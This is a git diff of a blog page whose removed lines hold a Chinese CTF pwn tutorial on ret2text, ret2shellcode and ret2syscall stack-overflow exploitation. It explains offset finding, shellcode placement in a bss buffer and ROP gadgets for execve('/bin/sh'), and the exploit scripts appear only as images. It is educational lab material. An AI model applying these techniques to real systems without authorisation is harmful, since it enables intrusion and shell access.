-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T17:36:37+08:00">
-                2018-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>虽然自己选择了病毒分析这个方向，但ctf比赛还是要打的，只做re的话未免太过单一，于是抽出时间来学习一下pwn的基础知识，做点题练练手。第一天主要是接触了pwn中的栈溢出部分的入门知识，也就是对应了ctf wiki上的基本ROP部分，简单的做个总结吧</p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的设置返回地址，而我们可以利用程序中的一些“无限制”的读取函数来覆盖掉返回地址，而当我们设置好了合适的大小时，我们就可以将eip随意设置成我们想要执行的函数的地址，而如果这个函数恰恰程序又给我们提供了的话，就实现了ret2text，简单说就是控制程序执行他本身原有的代码。当然，我们进行控制的时候也可以利用“零碎”的代码组成我们想要的，这是后话了。</p>
-<p>例子我们就使用ctf wiki上提供的ret2text，因为是我们的第一个pwn题目，所以我们来仔细进行一下每一步的总结。</p>
-<p>首先我们可以用peda自带的checksec函数来检查程序的保护机制（由于保护机制我后期想深入进行研究所以这里就不再赘述了，之后弄个详细的总结）</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf138f88b893.jpg" alt=""></p>
-<p>可以看到开启了NX（又叫DEP），也就是说栈上的数据不可以被执行了。</p>
-<p>紧接着我们用ida打开简单分析一下程序</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf149a905c1b.jpg" alt="2.jpg"></p>
-<p>很显然gets这里存在栈溢出漏洞，我们可以通过s对于ebp的偏移值直接计算出来我们的ret的地址，当然也可以使用peda中的工具，这里为了熟练一下工具的使用我就用一下工具吧</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1323ae9.jpg" alt="3.jpg"></p>
-<p>通过peda的pattern create xxx可以生成xxx个随机字符，我们就尝试用这个来溢出函数进而找到函数的返回地址（因为返回地址被我们的垃圾数据覆盖了，所以函数无法正常返回，我们就可以通过这一步的错误确定返回地址相对于我们的s的偏移量）</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a116dcf2.jpg" alt="4.jpg"></p>
-<p>使用pattern offset xxx可以查看到相对于xxx的偏移量，当然由于这里算出来的是ebp的，对于堆栈结构已经不陌生的我们就知道了，加4（64位程序+8）也就是我们的返回地址</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a12cfb6a.jpg" alt="5.jpg"></p>
-<p>我们在ida中查看到了程序中自带了system(“/bin/sh”/)函数，那我们直接拿这玩意的地址去填充原来函数的返回地址就好了，那我们就来写exp了</p>
-<p>successful</p>
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>在知道了ret2text的原理后这个就很好理解了，之前我们是借助程序提供的可以拿到shell的函数来实现pwn的，那万一程序中没有提供咋办？其实也很简单，我们可以在恰当的位置放上自己的shellcode然后去执行它，当然我们要提前知道我们可以布置shellcode的位置，毕竟我们是要运行这段shellcode，所以起码你放的地方得有执行的权限，比如上面那个题目，开启了NX，你要是把shellcode布置在栈上就完蛋了。</p>
-<p>前期的操作就不再赘述了，我们用ida打开程序进行一下简单的分析</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1330921.jpg" alt="6.jpg"></p>
-<p>主要函数部分如图所示，可以看懂栈溢出很明显，但更有趣的是下边的一句，它将我们的输入的0x64个字符复制到了buf2，我们点进去看看buf2是个什么东西</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a11c8291.jpg" alt="7.jpg"></p>
-<p>可以看到buf2是bss段的一个数组，但按照我们上面说的，我们需要把shellcode布置在有执行权限的地方，而这里是否有执行权限呢？我们可以通过peda的vmmap来看一看</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1480f90.jpg" alt="8.jpg"></p>
-<p>果然这一段是可执行的，那接下来的任务就简单了，只要我们输入shellcode，并且通过最后的返回地址返回到buf2的位置就可以实现pwn，下面是exp</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a133cd29.jpg" alt="9.jpg"></p>
-<p>successful</p>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>因为有逆向的基础，所以这个说起来也并不难，主要就是控制程序执行系统调用，关于什么是系统调用就不再提了，可以简单的看做是一个信号弹，这个信号一来系统就知道有事要干了，但具体干什么就由信号弹的颜色啊、声响啊等等各个方面综合决定了。linux中的这个信号弹就是int 80h，基本过程如下图所示</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1387ef5.jpg" alt="10.jpg"></p>
-<p>而pwn一般都是要去执行/bin/sh的，那就需要用系统调用号为0xb的execve了，这个函数有三个参数，分别用ebx、ecx和edx保存，其中第一个是字符串/bin/sh，其余两个是0。</p>
-<p>那我们如何去控制这几个寄存器的值呢？那就要用到gadgets了，我们利用一个个片段去拼凑出来我们需要的东西，比如，改变eax的值，我们可以用pop eax的方式去实现，只要栈上的值我们提前设置好就成了，那如何找到这些gadgets呢？我们可以利用ROPgadget这个工具</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a14928cc.jpg" alt="11.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a970040d.jpg" alt="12.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a96e5b9e.jpg" alt="13.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a978d54f.jpg" alt="14.jpg"></p>
-<p>万事具备，只欠脚本！</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a97391b2.jpg" alt="15.jpg"></p>
-<p>这里要注意我们的flat里面需要有一定的顺序，可以认为就是个放到的栈结构，最上面的是我们的系统调用，前面对于eax和其余三个寄存器的pop操则可以更换顺序（毕竟都是到int_80才开始使用的，前面的顺序也就无关紧要了）</p>
-<p>successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -853,7 +2273,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -864,7 +2284,7 @@ p.interactive()
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
